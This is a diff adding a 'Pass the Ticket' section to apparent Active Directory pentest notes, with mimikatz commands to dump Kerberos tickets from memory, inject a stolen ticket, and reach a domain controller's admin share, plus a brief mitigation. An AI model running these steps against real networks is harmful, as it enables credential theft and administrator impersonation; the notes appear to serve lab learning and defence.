@@ -90,3 +90,57 @@ Next, crack it with tools such as hashcat
 * Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
 * Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
 
+## Pass the Ticket w/ mimikatz
+
+### Prepare Mimikatz & Dump Tickets
+
+Run mimikatz:
+
+```powershell
+mimikatz.exe
+```
+
+Check privilege:
+
+```powershell
+privilege::debug
+```
+
+{% hint style="warning" %}
+Ensure above command outputs \[output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+{% endhint %}
+
+Export all of the .kirbi tickets into the directory that you are currently in:
+
+```powershell
+sekurlsa::tickets /export
+```
+
+### Pass the Ticket
+
+Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket:
+
+```powershell
+kerberos::ptt <ticket>
+```
+
+Now, go to **CMD or PowerShell**;
+
+Verifying that we successfully impersonated the ticket by listing our cached tickets:
+
+```powershell
+klist
+```
+
+Now, you can look at the admin share to verify it one more time:
+
+```powershell
+dir \\controller.local\admin$
+```
+
+### Pass the Ticket Mitigation
+
+* Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
+
+## Golden/Silver Ticket Attacks w/ mimikatz
+
